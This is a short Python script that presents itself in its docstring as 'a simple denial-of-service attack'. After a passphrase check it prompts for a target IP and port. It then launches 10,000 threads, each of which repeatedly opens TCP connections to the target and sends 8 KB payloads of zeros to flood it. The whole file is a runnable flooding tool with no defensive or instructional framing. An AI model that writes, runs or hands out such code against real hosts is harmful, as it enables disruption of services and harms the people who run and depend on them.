from threading import Thread
import socket
import time
import sys


def main():
    """ a simple denial-of-service attack """
    # Safety Key
    if input("Initiation Key: ").lower() != "god":
        print("security Error")
        sys.exit()

    # dynamic ip, port for every initiation
    _ip = question('ip: ', '192.168.31.1')
    _port = int(question('port: ', '80'))

    # main script
    def x():
        s = SocketWiz(_ip, _port)
        # "print" And "verbose" are slowing the program
        # print(s)
        s.quick(loop=10000, data_size=8192, timeout=1, verbose=True)

    t = [Thread(target=x) for _ in range(10000)]

    for _ in t:
        _.start()

    for _ in t:
        _.join()

    for i in range(5):
        print(f'\r{5 - i}', end='')
        time.sleep(1)
    print('\rDoS Attack End!')


def question(quest, answer):
    """make sure answer is not ''(empty str) or just ' '(spaces)"""
    print(f'Default: ({answer})')
    a = input(quest).strip()
    if a and a != answer:
        answer = a
    return answer


# v0.2
class SocketWiz:
    def __init__(self, ip='192.168.1.1', port=80):
        self._flag = None
        self._ip = ip
        self._port = port
        self.connect(timeout=1, verbose=False)

    def __str__(self):
        return f"SocketWiz v2\n{self._ip}:{self._port} | Status:{self._flag}\n"

    def __repr__(self):
        return "SocketWiz v2"

    @property
    def addr(self):
        return tuple((self._ip, self._port))

    @property
    def tcp_portal(self):
        return socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    @property
    def udp_portal(self):
        return socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    def change_addr(self):
        self._ip = question('IP: ', self._ip)
        self._port = int(question('PORT: ', self._port))

    def connect(self, timeout=3, verbose=True):
        portal = self.tcp_portal
        try:
            portal.settimeout(timeout)
            portal.connect_ex(self.addr)
            # portal.connect(self.addr)
            # portal.sendall("message to send".encode())
            # print(portal.recv(1024).decode())
            portal.close()
        except Exception as exc:
            self._flag = False
            print(exc) if verbose else None

        else:
            self._flag = True
            print(f'{self.addr} is Live') if verbose else None

    def quick(self, loop=1, data_size=128, timeout=1, verbose=False):
        for _ in range(loop):
            try:
                portal = self.tcp_portal
                portal.settimeout(timeout)
                portal.connect_ex(self.addr)
                portal.sendall(f"{data_size * '0'}".encode())
                portal.close()
            except Exception as exc:
                print(exc) if verbose else None
            else:
                print(f'[{str(_).zfill(3)}] : Live') if verbose else None


if __name__ == "__main__":
    main()
